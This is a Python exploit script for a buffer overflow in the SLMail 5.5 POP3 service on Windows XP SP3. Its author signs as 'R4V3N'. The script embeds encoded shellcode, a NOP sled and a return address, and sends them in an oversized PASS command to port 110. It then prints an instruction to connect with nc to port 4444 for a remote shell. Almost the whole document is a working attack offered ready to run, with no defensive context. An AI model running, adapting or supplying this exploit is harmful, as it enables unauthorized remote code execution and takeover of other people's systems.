#!/usr/bin/python


import socket,sys,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(8)

a = ("\xb8\x6c\x18\xa1\xcc\xd9\xcb\xd9\x74\x24\xf4\x5b\x31"
"\xc9\xb1\x53\x83\xeb\xfc\x31\x43\x0e\x03\x2f\x16\x43"
"\x39\x53\xce\x01\xc2\xab\x0f\x66\x4a\x4e\x3e\xa6\x28"
"\x1b\x11\x16\x3a\x49\x9e\xdd\x6e\x79\x15\x93\xa6\x8e"
"\x9e\x1e\x91\xa1\x1f\x32\xe1\xa0\xa3\x49\x36\x02\x9d"
"\x81\x4b\x43\xda\xfc\xa6\x11\xb3\x8b\x15\x85\xb0\xc6"
"\xa5\x2e\x8a\xc7\xad\xd3\x5b\xe9\x9c\x42\xd7\xb0\x3e"
"\x65\x34\xc9\x76\x7d\x59\xf4\xc1\xf6\xa9\x82\xd3\xde"
"\xe3\x6b\x7f\x1f\xcc\x99\x81\x58\xeb\x41\xf4\x90\x0f"
"\xff\x0f\x67\x6d\xdb\x9a\x73\xd5\xa8\x3d\x5f\xe7\x7d"
"\xdb\x14\xeb\xca\xaf\x72\xe8\xcd\x7c\x09\x14\x45\x83"
"\xdd\x9c\x1d\xa0\xf9\xc5\xc6\xc9\x58\xa0\xa9\xf6\xba"
"\x0b\x15\x53\xb1\xa6\x42\xee\x98\xae\xa7\xc3\x22\x2f"
"\xa0\x54\x51\x1d\x6f\xcf\xfd\x2d\xf8\xc9\xfa\x52\xd3"
"\xae\x94\xac\xdc\xce\xbd\x6a\x88\x9e\xd5\x5b\xb1\x74"
"\x25\x63\x64\xe0\x2d\xc2\xd7\x17\xd0\xb4\x87\x97\x7a"
"\x5d\xc2\x17\xa5\x7d\xed\xfd\xce\x16\x10\xfe\xe1\xba"
"\x9d\x18\x6b\x53\xc8\xb3\x03\x91\x2f\x0c\xb4\xea\x05"
"\x24\x52\xa2\x4f\xf3\x5d\x33\x5a\x53\xc9\xb8\x89\x67"
"\xe8\xbe\x87\xcf\x7d\x28\x5d\x9e\xcc\xc8\x62\x8b\xa6"
"\x69\xf0\x50\x36\xe7\xe9\xce\x61\xa0\xdc\x06\xe7\x5c"
"\x46\xb1\x15\x9d\x1e\xfa\x9d\x7a\xe3\x05\x1c\x0e\x5f"
"\x22\x0e\xd6\x60\x6e\x7a\x86\x36\x38\xd4\x60\xe1\x8a"
"\x8e\x3a\x5e\x45\x46\xba\xac\x56\x10\xc3\xf8\x20\xfc"
"\x72\x55\x75\x03\xba\x31\x71\x7c\xa6\xa1\x7e\x57\x62"
"\xd1\x34\xf5\xc3\x7a\x91\x6c\x56\xe7\x22\x5b\x95\x1e"
"\xa1\x69\x66\xe5\xb9\x18\x63\xa1\x7d\xf1\x19\xba\xeb"
"\xf5\x8e\xbb\x39")

b	= "\x90" * 2606
b	+= "\x25\x10\xc4\x77"
b	+= "\x90" * 4 
b	+= "\x81\xc4\x24\xfa\xff\xff" 
b	+= a

print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
print "=====Windows XP SP3 Rusiian======"
print "======SLMail 5.5 exploit======="
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "=-=-=-=-= BY R4V3N =-=-=-=-=-="
print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
print ""
print ""
print 'Usage: python exploit.py "target_host" '
print ""
print ""
print ""


try:
	print ("[*] Connecting...")
	s.connect((sys.argv[1], 110))
	print("[*] Sending shellcode...")
	s.send('USER Target' + '\r\n')
	print("[*] Sending last fragment...")
	s.send('PASS ' + b + '\r\n')
	print("[*] Exploit completed.")
	print('[*] To get a shell, type: nc "target_host" 4444')
	s.close	

except:
	print '[*] Service not responding or incorrect argument.'
	s.close

#Exploit by R4v3nG
#My Instagram: @r4v3ng
